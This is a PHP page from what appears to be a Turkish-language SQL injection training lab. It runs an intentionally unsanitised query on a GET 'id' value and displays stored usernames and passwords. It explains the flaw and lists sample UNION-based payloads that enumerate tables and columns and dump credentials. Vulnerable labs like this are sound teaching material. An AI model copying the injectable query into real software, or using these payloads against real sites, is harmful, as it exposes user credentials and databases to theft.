<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<?php require_once("includes/config.php")?>
<?php include("includes/header.php")?>

<?php error_reporting(E_ALL ^ E_NOTICE); ?>
<html xmlns="http://www.w3.org/1999/xhtml">



<body>



		<div class="row col-xs-12 col-sm-12 col-md-offset-1 col-md-10 col-lg-offset-1 col-lg-10">
			<br>
			<div class="col-xs-12 col-sm-12 col-md-6  col-lg-6">
				
			
				<form  action="#" name="kayit" method="GET">
      			 ID:&nbsp;&nbsp;<input type="text" name="id" style="width:85%;" ><br /><br />
     			 &nbsp;&nbsp;&nbsp;&nbsp;<input name="gonder" type="submit"	><br /><br />
    			</form>
<?php
	if( isset( $_GET[ 'gonder' ] ) ) { 

    $id = $_GET[ 'id' ];
	$query  = "SELECT * FROM users WHERE id =$id;";

    $result = mysqli_query($conn,  $query ) or die( '<pre>' . ((is_object($conn)) ? mysqli_error($conn) : (($___mysqli_res =mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    while( $row = mysqli_fetch_assoc( $result ) )
	 { 
		$idsi=$row["id"];
        $username = $row["username"]; 
        $password  = $row["password"];
		$tel=$row["telephone"];
		$mail=$row["email"];
		    
        echo "<pre>ID: {$idsi}<br />username: {$username}<br />password: {$password}<br>telefon: {$tel}<br>mail: {$mail}</pre>"; 
    } 

    mysqli_close($conn);
}
?>
                <br>
		</div>
			<div class="container col-xs-12 col-sm-12 col-md-6  col-lg-6">
				<h2>Yardım !</h2>
				<button type="button" class="btn btn-warning" data-toggle="collapse" data-target="#demo" >Yardım Görüntüle</button>
				<div id="demo" class="collapse">
				<br>
					<div class="panel panel-success">
						<div class="panel-heading">
							<h3 class="panel-title">Zafiyet Açıklama</h3>
						</div>
						<div class="panel-body">
							<p><ul>SQL injection sql dili özelliklerinden faydalanılarak ekranda bulunan müdahale edilebilecek alana ek
								SQL komutları yazarak yapılan bir ataktır.SQL injection uygulama içinde bulunan güvenlik açığından faydalanır.
								SQL cümlecikleri oluşturulurken araya sıkıştırılan herhagi bir meta karakter SQL injection’a neden olabilir.
								Meta-karakter bir program için özel anlamı olan karakterlere verilen isimdir. SQL’ için kritik metakarakter (‘)
								tek tırnak’ tır. Çünkü iki tek tırnağın arası string olarak algılanır. Diğer bir önemli meta-karakter ise (;) noktalı
								virgüldür, satırın bittiğini ve yeni satır başladığını bildirir.
							</ul></p>
						
						</div>
					</div>



					<div class="panel panel-danger">
						<div class="panel-heading">
							<h3 class="panel-title">Sömürü kaynak kodu</h3>
						</div>
						<div class="panel-body">
							<ul>Açığa sebebiyet veren kod parçacığı:</ul>
							<pre style="margin: 1em 0; display: inherit;">
							<br>$query  = "SELECT * FROM users WHERE id =$id;";</pre>
							<ul>Açık sebebi :Oluşan sömürünün nedeni gerekli validation kontrollerinin yapılmamış 
							olmasıdır. Kullanıcıların "yanlış" girdiden girmesini engelleyecek hiçbir şey yoksa,
							kullanıcı şu şekilde bir "akıllı" girdi girebilir: 	(100 OR 1=1 ).<br />    
							Bu şekilde  tüm database’i elde edebilirler ya da database ile ilgili herhangi bir işlem yapabilir.
</ul>
							<ul><b>Çözüm:</b>
								Yazdığımız fonksiyon Meta karakterleri engelliyor bu sayede kullanıcın databasee ulaşması için gerekli
								komutları girmesi engellenmiş olur.
								</b></ul>
							<pre style="margin: 1em 0; display: inherit;"><br><?php show_source("source/sql_cozum.php"); ?></pre>

						</div>
					</div>

					<div class="panel panel-warning">
						<div class="panel-heading">
							<h3 class="panel-title">Örnek Sömürüler</h3>
						</div>
                        
						<div class="panel-body">
							<ul>Tablo İsimleri:<pre>/sql.php?id=1%20union%20select%20group_concat(table_name),1,2,3,4%20from%20information_schema.tables%20where%20table_schema=database();&gonder=G%C3%B6nder#"> </pre>
                             
                            Kolon İsimleri :<br /><pre>/sql.php?id=1+union+select+0,1,group_concat(column_name),3,4+from+information_schema.columns+where+table_name=char(117,115,101,114,115)&gonder=Sorguyu+g%C3%B6nder#
                            </pre>
                             	Username ve Password<pre>/sql.php?id=1+union+select+0,1,group_concat(username,0x3a,password),3,4+from+users&gonder=Sorguyu+g%C3%B6nder#
                            </pre>
                            Tüm Database:<pre>/sql.php?id=100+or+1%3D1&gonder=G%C3%B6nder# </pre>
                           </ul>
						</div>
					</div>				
                    </div>
			</div>

		</div>

</body>




 
</html>



